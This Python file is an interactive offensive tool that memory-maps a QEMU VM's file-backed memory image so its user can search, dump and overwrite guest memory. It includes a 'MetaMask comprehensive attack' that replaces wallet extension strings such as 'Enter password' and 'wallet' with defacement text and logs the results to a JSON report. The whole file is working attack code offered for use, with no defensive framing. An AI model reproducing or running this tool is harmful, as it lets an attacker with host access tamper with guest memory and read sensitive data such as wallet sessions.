#!/usr/bin/env python3
"""
PASIV File-Based DMA Attack Tool
Direct memory manipulation via QEMU file-backed memory
"""

import os
import sys
import time
import json
import mmap
import struct
from datetime import datetime
from typing import List, Dict, Tuple, Optional

class FileDMAAttacker:
    def __init__(self, memory_file: str = "./pasiv_vm_memory.img"):
        self.memory_file = memory_file
        self.file_handle = None
        self.memory_map = None
        self.memory_size = 0
        
        if not os.path.exists(memory_file):
            raise FileNotFoundError(f"Memory file not found: {memory_file}")
            
        print(f"🎯 PASIV File-Based DMA Attacker")
        print(f"📁 Memory file: {memory_file}")
        print(f"📊 File size: {os.path.getsize(memory_file):,} bytes")
        
    def open_memory(self):
        """Open the memory file for direct access"""
        try:
            self.file_handle = open(self.memory_file, 'r+b')
            self.memory_size = os.path.getsize(self.memory_file)
            
            # Memory map the entire VM memory
            self.memory_map = mmap.mmap(self.file_handle.fileno(), 0)
            
            print(f"✅ Memory mapped: {self.memory_size:,} bytes")
            return True
            
        except Exception as e:
            print(f"❌ Failed to open memory: {e}")
            return False
    
    def close_memory(self):
        """Close memory access"""
        if self.memory_map:
            self.memory_map.close()
        if self.file_handle:
            self.file_handle.close()
    
    def search_string(self, target: str, max_results: int = 100) -> List[Tuple[int, str]]:
        """Search for strings in VM memory"""
        if not self.memory_map:
            return []
            
        results = []
        target_bytes = target.encode('utf-8', errors='ignore')
        
        print(f"🔍 Searching for: '{target}'")
        
        # Search through memory
        offset = 0
        while offset < self.memory_size and len(results) < max_results:
            try:
                found = self.memory_map.find(target_bytes, offset)
                if found == -1:
                    break
                    
                # Extract surrounding context
                start = max(0, found - 50)
                end = min(self.memory_size, found + len(target_bytes) + 50)
                context = self.memory_map[start:end]
                context_str = context.decode('utf-8', errors='replace')
                
                results.append((found, context_str))
                offset = found + 1
                
            except Exception as e:
                offset += 1024  # Skip ahead on error
                continue
                
        print(f"✅ Found {len(results)} occurrences")
        return results
    
    def read_memory(self, offset: int, size: int) -> bytes:
        """Read raw memory at offset"""
        if not self.memory_map:
            return b''
            
        try:
            return self.memory_map[offset:offset + size]
        except Exception as e:
            print(f"❌ Failed to read memory at 0x{offset:x}: {e}")
            return b''
    
    def write_memory(self, offset: int, data: bytes) -> bool:
        """Write data directly to VM memory"""
        if not self.memory_map:
            return False
            
        try:
            # Read original data for verification
            original = self.memory_map[offset:offset + len(data)]
            
            # Perform the write
            self.memory_map[offset:offset + len(data)] = data
            self.memory_map.flush()  # Ensure write to disk
            
            # Verify write
            written = self.memory_map[offset:offset + len(data)]
            
            print(f"🎯 DMA Write at 0x{offset:x}")
            print(f"   Original: {original}")
            print(f"   Written:  {written}")
            print(f"   Success:  {written == data}")
            
            return written == data
            
        except Exception as e:
            print(f"❌ Failed to write memory at 0x{offset:x}: {e}")
            return False
    
    def search_and_replace(self, search_str: str, replace_str: str, max_replacements: int = 10) -> List[Dict]:
        """Search for strings and replace them"""
        results = []
        
        # Find target strings
        occurrences = self.search_string(search_str, max_replacements * 2)
        
        print(f"\n🔥 DMA String Replacement Attack")
        print(f"Target: '{search_str}' → '{replace_str}'")
        print(f"Found {len(occurrences)} potential targets")
        
        replacements_made = 0
        
        for offset, context in occurrences:
            if replacements_made >= max_replacements:
                break
                
            try:
                # Check if we can write here (basic heuristic)
                test_read = self.read_memory(offset, len(search_str))
                if search_str.encode('utf-8') not in test_read:
                    continue
                
                # Prepare replacement data
                search_bytes = search_str.encode('utf-8')
                replace_bytes = replace_str.encode('utf-8')
                
                # Pad or truncate to same length to avoid memory corruption
                if len(replace_bytes) < len(search_bytes):
                    replace_bytes = replace_bytes.ljust(len(search_bytes), b'\x00')
                elif len(replace_bytes) > len(search_bytes):
                    replace_bytes = replace_bytes[:len(search_bytes)]
                
                # Perform replacement
                if self.write_memory(offset, replace_bytes):
                    result = {
                        'offset': offset,
                        'offset_hex': f"0x{offset:x}",
                        'original': search_str,
                        'replacement': replace_str,
                        'context_before': context,
                        'timestamp': datetime.now().isoformat(),
                        'success': True
                    }
                    results.append(result)
                    replacements_made += 1
                    
                    print(f"✅ Replacement {replacements_made} at 0x{offset:x}")
                    
            except Exception as e:
                print(f"❌ Failed replacement at 0x{offset:x}: {e}")
                
        print(f"\n🎯 Attack Summary: {replacements_made} successful replacements")
        return results
    
    def metamask_attack(self) -> Dict:
        """Comprehensive MetaMask DMA attack"""
        print(f"\n🦊 MetaMask DMA Attack")
        print("=" * 50)
        
        attacks = []
        
        # Common MetaMask strings to replace
        targets = [
            ("Welcome back", "HACKED BACK"),
            ("Enter password", "LEAK PASSWORD"),
            ("metamask", "PWNED!!!"),
            ("MetaMask", "HIJACKED"),
            ("password", "STOLEN!!"),
            ("wallet", "OWNED!!"),
            ("Extension", "HACKED!")
        ]
        
        for search, replace in targets:
            results = self.search_and_replace(search, replace, max_replacements=5)
            if results:
                attacks.extend(results)
                time.sleep(0.1)  # Brief pause between attacks
        
        # Save attack report
        report = {
            'attack_type': 'file_based_dma_metamask',
            'timestamp': datetime.now().isoformat(),
            'memory_file': self.memory_file,
            'total_replacements': len(attacks),
            'attacks': attacks
        }
        
        report_file = f"dma_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n📊 Attack Report saved: {report_file}")
        return report

def main():
    if len(sys.argv) > 1:
        memory_file = sys.argv[1]
    else:
        memory_file = "./pasiv_vm_memory.img"
    
    attacker = FileDMAAttacker(memory_file)
    
    try:
        if not attacker.open_memory():
            sys.exit(1)
        
        print("\n" + "=" * 60)
        print("🎯 PASIV File-Based DMA Attack Framework")
        print("=" * 60)
        
        while True:
            print("\n🔥 Attack Options:")
            print("1. Search for strings")
            print("2. Manual string replacement")
            print("3. MetaMask comprehensive attack")
            print("4. Memory dump (hex)")
            print("5. Exit")
            
            choice = input("\nSelect attack (1-5): ").strip()
            
            if choice == "1":
                target = input("Search string: ")
                results = attacker.search_string(target)
                for i, (offset, context) in enumerate(results[:10]):
                    print(f"{i+1}. 0x{offset:x}: {context[:100]}")
                    
            elif choice == "2":
                search = input("Search for: ")
                replace = input("Replace with: ")
                results = attacker.search_and_replace(search, replace)
                print(f"Completed {len(results)} replacements")
                
            elif choice == "3":
                report = attacker.metamask_attack()
                print(f"🎯 MetaMask attack completed: {report['total_replacements']} hits")
                
            elif choice == "4":
                offset_str = input("Memory offset (hex, e.g., 0x1000): ")
                size = int(input("Size (bytes): "))
                try:
                    offset = int(offset_str, 16)
                    data = attacker.read_memory(offset, size)
                    print(f"\nMemory at 0x{offset:x}:")
                    print(data.hex())
                    print(f"ASCII: {data.decode('utf-8', errors='replace')}")
                except Exception as e:
                    print(f"Error: {e}")
                    
            elif choice == "5":
                break
            else:
                print("Invalid choice")
    
    finally:
        attacker.close_memory()
        print("\n🔒 Memory access closed")

if __name__ == "__main__":
    main() 